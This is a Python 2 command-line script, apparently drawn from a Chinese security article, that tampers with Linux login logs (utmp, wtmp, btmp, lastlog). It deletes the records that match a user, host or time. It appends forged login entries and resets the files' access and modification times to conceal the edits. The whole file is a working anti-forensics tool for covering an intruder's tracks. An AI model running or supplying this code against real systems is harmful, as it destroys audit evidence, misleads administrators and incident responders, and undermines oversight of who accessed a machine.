#!/usr/bin/env python2
# -*- coding:utf-8 -*-
# author knpewg85942
# link:https://www.freebuf.com/articles/system/141474.html
# blog:https://forreestx386.github.io/

import os
import sys
import time
import random
import struct
import argparse
from pwd import getpwnam


class GeneralError(Exception):
    pass


class FakeLog(object):
    def __init__(self, args):
        self.type = args.type
        self.user = args.user
        self.host = args.host
        self.timestamp = args.timestamp
        try:
            self.date = str(
                time.mktime(time.strptime(
                    args.date,
                    "%Y-%m-%d %H:%M:%S"))).split('.')[0] if args.date else None
        except ValueError, e:
            self.date = str(
                time.mktime(
                    time.strptime(args.date + ':0',
                                  "%Y-%m-%d %H:%M:%S"))).split('.')[0]
            self.date_end = str(
                time.mktime(
                    time.strptime(args.date +
                                  ":59", "%Y-%m-%d %H:%M:%S"))).split(
                                      '.')[0] if args.date else None

        self.tty = args.tty
        self.pid = args.pid
        self.FILE_DICT = {
            'utmp': '/var/run/utmp',
            'wtmp': '/var/log/wtmp',
            'btmp': '/var/log/btmp',
            'lastlog': '/var/log/lastlog'
        }
        self.FILE_PATH = self.FILE_DICT[self.type]
        self.XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
        self.XTMP_STRUCT_SIZE = struct.calcsize(self.XTMP_STRUCT)
        self.LAST_STRUCT = 'I32s256s'
        self.LAST_STRUCT_SIZE = struct.calcsize(self.LAST_STRUCT)

    def get_timestamp_by_user(self):
        """
        根据用户名，从/var/log/wtmp中获取用户最后一次登录记录的时间戳
        :return:
        """
        _result = []
        with open(self.FILE_DICT['wtmp'], 'rb') as fd:
            while True:
                record_bytes = fd.read(self.XTMP_STRUCT_SIZE)
                if not record_bytes:
                    break
                data = struct.unpack(self.XTMP_STRUCT, record_bytes)
                record = [(lambda s: str(s).split("\0", 1)[0])(i)
                          for i in data]
                if record[4] == self.user:
                    _result.append(record[-6])
        return max(_result) if _result else None

    def delete_log(self):
        """
         根据条件删除utmp | wtmp |btmp |lastlog 中的记录
        :return:
        """
        to_remain = ''
        _atime = os.stat(self.FILE_PATH).st_atime  # 保存修改前的文件时间属性，以便修改后恢复
        _mtime = os.stat(self.FILE_PATH).st_mtime

        if self.type.endswith('tmp'):  # deal xtmp log
            try:
                with open(self.FILE_PATH, 'rb') as fd:
                    while True:
                        record_bytes = fd.read(self.XTMP_STRUCT_SIZE)
                        if not record_bytes:
                            break
                        data = struct.unpack(self.XTMP_STRUCT, record_bytes)
                        record = [(lambda s: str(s).split("\0", 1)[0])(i)
                                  for i in data]
                        _user = record[4]
                        _host = record[5]
                        _date = record[9]

                        if self.user:
                            if self.user == _user:
                                if self.host:
                                    if self.host == _host:
                                        if self.date:
                                            if self.date <= _date <= self.date_end:
                                                continue
                                            else:
                                                to_remain += record_bytes
                                        else:
                                            continue
                                    else:
                                        to_remain += record_bytes
                                elif self.date:
                                    if self.date <= _date <= self.date_end:
                                        continue
                                    else:
                                        to_remain += record_bytes
                                else:
                                    continue
                            else:
                                to_remain += record_bytes
                        elif self.host:
                            if self.host == _host:
                                if self.date:
                                    if self.date <= _date <= self.date_end:
                                        continue
                                    else:
                                        to_remain += record_bytes
                                else:
                                    continue
                            else:
                                to_remain += record_bytes
                        else:
                            if self.date <= _date <= self.date_end:
                                continue
                            else:
                                to_remain += record_bytes
            except IOError as e:
                raise GeneralError('file error: {0}'.format(e.message))
            except Exception, e:
                raise GeneralError('error occur: {0}'.format(e.message))
            else:
                with open(self.FILE_PATH, 'wb') as fd:
                    fd.write(to_remain)
                os.utime(self.FILE_PATH,
                         (_atime, _mtime))  # restore a file atime, mtime

        else:  # deal lastlog, 根据unix时间戳或用户名删除指定用户最后一次登录记录
            try:
                with open(self.FILE_PATH, 'rb') as fd:
                    while True:
                        record_bytes = fd.read(self.LAST_STRUCT_SIZE)
                        if not record_bytes:
                            break
                        data = struct.unpack(self.LAST_STRUCT, record_bytes)
                        record = [(lambda s: str(s).split("\0", 1)[0])(i)
                                  for i in data]
                        _timestamp = record[0]
                        _host = record[2]

                        if self.host:
                            if self.host == _host:
                                if self.date:
                                    if self.date == _timestamp:
                                        continue
                                    else:
                                        to_remain += record_bytes
                                else:
                                    continue
                            else:
                                to_remain += record_bytes
                        elif self.date:
                            if self.date == _timestamp:
                                continue
                            else:
                                to_remain += record_bytes
                        else:
                            to_remain += record_bytes
            except IOError as e:
                raise GeneralError('file error: {0}'.format(e.message))
            except Exception, e:
                raise GeneralError('error occur: {0}'.format(e.message))
            else:
                with open(self.FILE_PATH, 'wb') as fd:
                    fd.write(to_remain)
                os.utime(self.FILE_PATH,
                         (_atime, _mtime))  # restore a file atime, mtime

    def add_log(self):
        """
        根据条件，增加额外混淆日志
        utmp | wtmp | btmp | lastlog
        :return:
        """
        to_add_xtmp = [
            7, 13009, 'pts/4', 'ts/4', 'root', '10.1.100.10', 0, 0, 0,
            1500475658, 498851, 23331082, 0, 0, 0
        ]

        to_add_btmp = [
            6, 13732, 'ssh:notty', '', 'root', '10.1.100.1', 0, 0, 0,
            1500311234, 0, 23331082, 0, 0, 0
        ]

        record_bytes = None
        _backup = None
        _atime = os.stat(self.FILE_PATH).st_atime
        _mtime = os.stat(self.FILE_PATH).st_mtime

        if self.FILE_PATH.endswith('utmp') or self.FILE_PATH.endswith('wtmp'):
            if self.user:
                to_add_xtmp[4] = self.user
            if self.host:
                to_add_xtmp[5] = self.host
            if self.tty:
                to_add_xtmp[2] = self.tty
                to_add_xtmp[3] = self.tty[1:]
            if self.pid:
                to_add_xtmp[1] = int(self.pid)
            if self.date:
                to_add_xtmp[-6] = int(self.date) + random.randint(1, 60)
            if self.timestamp:
                # 修改用户退出登录的时间
                to_add_xtmp[-6] = int(self.timestamp)

            record_bytes = struct.pack(self.XTMP_STRUCT, *to_add_xtmp)

            with open(self.FILE_PATH, 'rb') as fd:
                _backup = fd.read() + record_bytes

            with open(self.FILE_PATH, 'wb') as fd:
                fd.write(_backup)

            os.utime(self.FILE_PATH,
                     (_atime, _mtime))  # restore a file atime, mtime

        elif self.FILE_PATH.endswith('btmp'):
            if self.user:
                to_add_btmp[4] = self.user
            if self.host:
                to_add_btmp[5] = self.host
            if self.tty:
                to_add_btmp[2] = self.tty
                to_add_btmp[3] = self.tty[1:]
            if self.pid:
                to_add_btmp[1] = int(self.pid)
            if self.date:
                to_add_btmp[-6] = int(self.date)
            if self.timestamp:
                to_add_btmp[-6] = int(self.timestamp)

            record_bytes = struct.pack(self.XTMP_STRUCT, *to_add_btmp)
            with open(self.FILE_PATH, 'rb') as fd:
                _backup = fd.read() + record_bytes

            with open(self.FILE_PATH, 'wb') as fd:
                fd.write(_backup)
            os.utime(self.FILE_PATH,
                     (_atime, _mtime))  # restore a file atime, mtime

        else:
            __host = '10.1.100.1'
            __date = 1500860089
            __tty = 'pts/8'
            if self.user:
                try:
                    p = getpwnam(self.user)
                except:
                    raise GeneralError('No such user.')

                if self.host:
                    __host = self.host
                if self.date:
                    __date = int(self.date)
                if self.timestamp:
                    __date = int(self.timestamp)
                if self.tty:
                    __tty = self.tty

                data = struct.pack(self.LAST_STRUCT, __date, __tty, __host)
                try:
                    with open(self.FILE_PATH, 'wb') as fd:
                        fd.seek(self.LAST_STRUCT_SIZE * p.pw_uid)
                        fd.write(data)
                except Exception, e:
                    raise GeneralError('Cannot open file: {0}'.format(
                        e.message))


if __name__ == '__main__':

    reload(sys)

    sys.setdefaultencoding('utf8')

    usage = 'usage: fake_login_log.py --mode delete --type utmp --user root --host 10.1.100.1\n \
        fake_login_log.py --mode delete --type wtmp --user root --host 10.1.100.1 --date '

    parse = argparse.ArgumentParser(usage=usage)
    parse.add_argument('--mode',
                       dest='mode',
                       type=str,
                       required=True,
                       help='add, delete log')
    parse.add_argument('--type',
                       dest='type',
                       type=str,
                       choices=['utmp', 'wtmp', 'btmp', 'lastlog'],
                       required=True,
                       help='utmp |wtmp |btmp |lastlog')
    parse.add_argument('--user', dest='user', type=str, help='login username')
    parse.add_argument('--host', dest='host', type=str, help='login from host')
    parse.add_argument('--date',
                       dest='date',
                       type=str,
                       help='login time 2017-7-20 15:30')
    parse.add_argument('--timestamp',
                       dest='timestamp',
                       type=str,
                       help='login time 1500475126')
    parse.add_argument('--pid',
                       dest='pid',
                       type=str,
                       default=random.randint(os.getpid() + 100,
                                              os.getpid() + 1000),
                       help='process id, for add  only')
    parse.add_argument('--tty', dest='tty', type=str, help='for add only')

    argument = parse.parse_args()

    if argument.mode not in ('add', 'delete', 'modify'):
        raise GeneralError('error mode')

    if not any(
        (argument.user, argument.host, argument.date, argument.timestamp)):
        raise GeneralError(
            'you must choose at least user | host | date |timestamp as condition'
        )

    if argument.mode == 'add':
        print "add"
        FakeLog(argument).add_log()
    else:
        print "delete"
        FakeLog(argument).delete_log()
